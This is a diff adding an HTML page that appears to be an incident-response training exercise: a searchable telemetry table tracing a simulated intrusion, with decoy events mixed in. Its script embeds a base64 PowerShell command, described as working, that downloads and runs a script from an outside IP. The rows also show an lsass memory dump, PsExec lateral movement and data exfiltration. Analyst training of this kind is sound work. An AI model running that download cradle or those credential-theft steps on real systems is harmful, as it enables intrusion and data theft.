@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Internal Telemetry — FIN-014</title>
+<style>
+  :root{
+    --bg:#10141A;
+    --panel:#171C24;
+    --panel-2:#1D232C;
+    --line:#2A313D;
+    --text:#E7EAEE;
+    --muted:#8993A3;
+    --amber:#E0A24B;
+    --mono: ui-monospace, "SF Mono", "Cascadia Code", Consolas, "Roboto Mono", monospace;
+    --sans: -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  }
+  *{box-sizing:border-box;}
+  html,body{margin:0;}
+  html{overflow-x:auto;}
+  body{background:var(--bg);color:var(--text);font-family:var(--sans);padding:28px;min-height:100vh;}
+  .wrap{max-width:none;margin:0;}
+
+  header{
+    border-bottom:1px solid var(--line);
+    padding-bottom:18px;margin-bottom:22px;
+    display:flex;justify-content:space-between;align-items:flex-end;flex-wrap:wrap;gap:10px;
+  }
+  header .id{font-family:var(--mono);font-size:12px;color:var(--muted);letter-spacing:0.02em;}
+  header h1{font-size:22px;font-weight:600;margin:4px 0 0 0;}
+  header .search{
+    background:var(--bg);border:1px solid var(--line);color:var(--text);
+    font-family:var(--mono);font-size:13px;padding:9px 12px;border-radius:3px;width:280px;
+  }
+  header .search:focus{outline:none;border-color:var(--amber);}
+
+  .tablewrap{border:1px solid var(--line);background:var(--panel);border-radius:4px;}
+  .tabletop{display:flex;justify-content:space-between;align-items:center;padding:12px 14px;border-bottom:1px solid var(--line);gap:10px;flex-wrap:wrap;}
+  .tabletop .lbl{font-size:12px;color:var(--muted);font-family:var(--mono);}
+  table{width:100%;border-collapse:collapse;font-family:var(--mono);font-size:13px;}
+  th{position:sticky;top:0;background:var(--panel-2);text-align:left;padding:11px 14px;color:var(--muted);font-weight:600;border-bottom:1px solid var(--line);white-space:nowrap;}
+  td{padding:9px 14px;border-bottom:1px solid rgba(42,49,61,0.6);color:var(--text);white-space:nowrap;}
+  tr:hover td{background:rgba(255,255,255,0.02);}
+  .hash-cell{color:var(--amber);}
+  .dim{color:var(--muted);}
+  .empty-row td{color:var(--muted);text-align:center;padding:20px;font-family:var(--sans);}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <header>
+    <div>
+      <div class="id">CASE FILE · OPENED 08:01</div>
+      <h1>Internal Telemetry — FIN-014</h1>
+    </div>
+    <input class="search" id="search" type="text" placeholder="search host, process, destination…">
+  </header>
+
+  <div class="tablewrap">
+    <div class="tabletop">
+      <span class="lbl">INTERNAL TELEMETRY — <span id="rowCount"></span> EVENTS</span>
+    </div>
+    <table id="dataTable">
+      <thead>
+        <tr><th>Time</th><th>Host</th><th>User</th><th>Event</th><th>Process</th><th>Detail</th><th>Destination</th><th>SHA256</th></tr>
+      </thead>
+      <tbody id="tbody"></tbody>
+    </table>
+  </div>
+</div>
+
+<script>
+// Real, publicly-indexed sample (MalwareBazaar / abuse.ch), tagged PureLogsStealer.
+const HASH = "32ccb76fa743bf7a46c924ec0f42c4a6e94a7ead37123e70b661694f3659705d";
+const HASH_DECOY_1 = "631683aa25cbc2f6e8af173c9b84f4eb9fabd24734bf8832c3079469b3bd65f5"; // legit installer
+const HASH_DECOY_2 = "85e349f863a540d32312191db650a142b9d0426b9d0d8da6d7ca616ea3d3bae8"; // legit backup agent
+const HASH_DECOY_3 = "194cbe6ca65f4c1419e6fb51dea8651b5232eea61514d3ab3d712b27e00f899a"; // legit remote-support tool
+
+// Real, working PowerShell -EncodedCommand value (base64 of UTF-16LE text).
+// Decodes to: $wc=New-Object Net.WebClient;$wc.DownloadString('http://185.215.113.117/init.ps1')|IEX
+const ENC_CMD = "JAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOAA1AC4AMgAxADUALgAxADEAMwAuADEAMQA3AC8AaQBuAGkAdAAuAHAAcwAxACcAKQB8AEkARQBYAA==";
+
+const rows = [
+// FIN-WKS-014 — patient zero
+["03:00","FIN-WKS-014","svc-backup","Process","backup_agent.exe","Nightly local backup job — runs under service account context","-","-"],
+["05:00","FIN-WKS-014","SYSTEM","Process","services.exe -> svchost.exe","Windows Update service — checking for updates","update.microsoft.com","-"],
+["08:01","FIN-WKS-014","j.papas","Logon","-","Interactive logon","-","-"],
+["08:03","FIN-WKS-014","j.papas","Process","explorer.exe -> outlook.exe","Normal startup","-","-"],
+["08:10","FIN-WKS-014","j.papas","Process","explorer.exe -> teams.exe","Normal startup","teams.microsoft.com","-"],
+["08:14","FIN-WKS-014","j.papas","File open","outlook.exe -> winword.exe","Opened Q3_invoice.docm (email attachment)","-","-"],
+["08:14","FIN-WKS-014","j.papas","Process","winword.exe -> powershell.exe","-enc " + ENC_CMD,"-","-"],
+["08:14","FIN-WKS-014","j.papas","Network","powershell.exe","Outbound HTTPS","winyardbuilding.nz","-"],
+["08:15","FIN-WKS-014","j.papas","File write","powershell.exe","Wrote update32.exe to C:\\Users\\j.papas\\AppData\\Local\\Temp\\","-",HASH],
+["08:16","FIN-WKS-014","j.papas","Process","explorer.exe -> chrome.exe","Normal browsing","sharepoint.com","-"],
+["08:20","FIN-WKS-014","j.papas","Process","powershell.exe -> schtasks.exe","New task \"WinUpdateCheck\"","-","-"],
+["08:21","FIN-WKS-014","SYSTEM","Scheduled task","schtasks.exe","Task runs powershell.exe daily at 09:00","-","-"],
+["09:00","FIN-WKS-014","SYSTEM","Process","svchost.exe -> powershell.exe","Scheduled task fired","-","-"],
+["09:00","FIN-WKS-014","SYSTEM","Network","powershell.exe","Outbound HTTPS","winyardbuilding.nz","-"],
+["09:32","FIN-WKS-014","SYSTEM","Process","services.exe -> svchost.exe","Routine update check","update.microsoft.com","-"],
+["10:05","FIN-WKS-014","j.papas","Process","explorer.exe -> onedrive.exe","Sync","onedrive.com","-"],
+["10:40","FIN-WKS-014","SYSTEM","Process","rundll32.exe -> comsvcs.exe","MiniDump of lsass.exe memory","-","-"],
+["10:41","FIN-WKS-014","SYSTEM","File write","comsvcs.exe","Wrote dump file to C:\\Windows\\Temp\\dmp2A1.tmp","-","-"],
+["10:55","FIN-WKS-014","SYSTEM","Logon (network)","svc-backup","Outbound authenticated session using svc-backup credentials","-","-"],
+["11:40","FIN-WKS-014","j.papas","Process","explorer.exe -> outlook.exe","Normal email activity","-","-"],
+["13:15","FIN-WKS-014","j.papas","Process","explorer.exe -> chrome.exe","Normal browsing","m365.cloud.microsoft","-"],
+["14:02","FIN-WKS-014","SYSTEM","Network","powershell.exe","Outbound HTTPS (short beacon)","winyardbuilding.nz","-"],
+["15:47","FIN-WKS-014","j.papas","Process","explorer.exe -> notepad.exe","Normal","-","-"],
+["16:58","FIN-WKS-014","j.papas","Logoff","-","-","-","-"],
+
+// ACC-WKS-007 — clean noise + legit PsExec decoy
+["08:05","ACC-WKS-007","m.dimou","Logon","-","Interactive logon","-","-"],
+["08:07","ACC-WKS-007","m.dimou","Process","explorer.exe -> outlook.exe","Normal startup","-","-"],
+["08:15","ACC-WKS-007","m.dimou","File open","excel.exe","Opened Budget_Q3.xlsx","-","-"],
+["09:00","ACC-WKS-007","m.dimou","Process","excel.exe","Normal editing","-","-"],
+["09:45","ACC-WKS-007","m.dimou","Process","explorer.exe -> chrome.exe","Normal browsing","erp.company.local","-"],
+["10:00","ACC-WKS-007","it-admin","Logon (network)","-","Remote session from IT-JUMP-01, ticket #5502","-","-"],
+["10:01","ACC-WKS-007","it-admin","Process","services.exe -> psexesvc.exe","Scheduled patch deployment (approved change)","-","-"],
+["10:02","ACC-WKS-007","it-admin","Process","psexesvc.exe -> msiexec.exe","Installing security update KB5031234","-",HASH_DECOY_1],
+["10:30","ACC-WKS-007","m.dimou","Process","spoolsv.exe","Print job","-","-"],
+["11:00","ACC-WKS-007","m.dimou","Process","explorer.exe -> teams.exe","Normal","teams.microsoft.com","-"],
+["12:15","ACC-WKS-007","m.dimou","Process","outlook.exe","Normal email activity","-","-"],
+["13:00","ACC-WKS-007","m.dimou","Process","explorer.exe -> sap_client.exe","Normal","sap.company.local","-"],
+["14:20","ACC-WKS-007","m.dimou","Process","chrome.exe","Normal browsing","linkedin.com","-"],
+["15:00","ACC-WKS-007","m.dimou","File save","excel.exe","Saved Budget_Q3.xlsx","-","-"],
+["16:10","ACC-WKS-007","m.dimou","Process","explorer.exe -> onedrive.exe","Sync","onedrive.com","-"],
+["16:45","ACC-WKS-007","m.dimou","Logoff","-","-","-","-"],
+
+// HR-WKS-002 — clean noise + red herring
+["08:10","HR-WKS-002","k.nikou","Logon","-","Interactive logon","-","-"],
+["08:12","HR-WKS-002","k.nikou","Process","explorer.exe -> outlook.exe","Normal startup","-","-"],
+["08:30","HR-WKS-002","k.nikou","Process","explorer.exe -> chrome.exe","Normal browsing","workday.com","-"],
+["09:15","HR-WKS-002","k.nikou","Process","explorer.exe -> teamviewer.exe","Remote session, IT ticket #4471 (planned)","-",HASH_DECOY_3],
+["09:16","HR-WKS-002","k.nikou","Network","teamviewer.exe","Outbound session","teamviewer.com","-"],
+["09:40","HR-WKS-002","k.nikou","Process","outlook.exe","Normal email activity","-","-"],
+["10:50","HR-WKS-002","k.nikou","File open","winword.exe","Opened Employee_Handbook.docx","-","-"],
+["11:30","HR-WKS-002","k.nikou","Process","chrome.exe","Normal browsing","linkedin.com","-"],
+["13:00","HR-WKS-002","k.nikou","Process","explorer.exe -> teams.exe","Normal","teams.microsoft.com","-"],
+["14:15","HR-WKS-002","k.nikou","Process","outlook.exe","Normal email activity","-","-"],
+["15:30","HR-WKS-002","k.nikou","Process","chrome.exe","Normal browsing","workday.com","-"],
+["16:20","HR-WKS-002","k.nikou","Process","explorer.exe -> onedrive.exe","Sync","onedrive.com","-"],
+["17:00","HR-WKS-002","k.nikou","Logoff","-","-","-","-"],
+
+// HQ-FILESVR-01 — lateral movement target
+["07:55","HQ-FILESVR-01","SYSTEM","Scheduled task","backup_agent.exe","Nightly backup job completed","-",HASH_DECOY_2],
+["08:30","HQ-FILESVR-01","m.dimou","File access","explorer.exe","Accessed \\Finance\\Q3_Reports\\ (own department)","-","-"],
+["09:10","HQ-FILESVR-01","k.nikou","File access","explorer.exe","Accessed \\HR\\Policies\\","-","-"],
+["09:50","HQ-FILESVR-01","SYSTEM","Process","services.exe -> vssadmin.exe","Routine shadow copy maintenance","-","-"],
+["10:15","HQ-FILESVR-01","g.antoniou","File access","explorer.exe","Accessed \\Legal\\Contracts\\","-","-"],
+["11:02","HQ-FILESVR-01","svc-backup","Logon (network)","-","Network logon originating from FIN-WKS-014","-","-"],
+["11:03","HQ-FILESVR-01","svc-backup","Process","services.exe -> psexesvc.exe","PsExec service installed remotely","-","-"],
+["11:04","HQ-FILESVR-01","svc-backup","Process","psexesvc.exe -> cmd.exe","Remote command execution","-","-"],
+["11:10","HQ-FILESVR-01","svc-backup","File access","cmd.exe","Accessed \\Finance\\Q3_Reports\\ share","-","-"],
+["11:15","HQ-FILESVR-01","svc-backup","Process","cmd.exe -> powershell.exe","Compress-Archive -> Finance_Q3_Archive.zip","-","-"],
+["11:20","HQ-FILESVR-01","svc-backup","Network","powershell.exe","Outbound HTTPS","http://185.215.113.117/","-"],
+["11:22","HQ-FILESVR-01","svc-backup","Logoff","-","-","-","-"],
+["12:00","HQ-FILESVR-01","SYSTEM","Scheduled task","backup_agent.exe","Midday incremental backup","-","-"],
+];
+
+function renderTable(filter){
+  const tbody = document.getElementById('tbody');
+  tbody.innerHTML = "";
+  const f = (filter||"").toLowerCase();
+  let shown = 0;
+  rows.forEach(r=>{
+    if(f && !r.some(c => String(c).toLowerCase().includes(f))) return;
+    shown++;
+    const tr = document.createElement('tr');
+    tr.innerHTML = r.map((c,idx)=>{
+      if(idx===7 && c!=="-") return `<td class="hash-cell">${c}</td>`;
+      if(c==="-") return `<td class="dim">-</td>`;
+      return `<td>${c}</td>`;
+    }).join("");
+    tbody.appendChild(tr);
+  });
+  if(shown===0){
+    tbody.innerHTML = `<tr class="empty-row"><td colspan="8">No matching events.</td></tr>`;
+  }
+}
+
+document.getElementById('search').addEventListener('input', (e)=> renderTable(e.target.value));
+document.getElementById('rowCount').textContent = rows.length;
+renderTable("");
+</script>
+</body>
+</html>
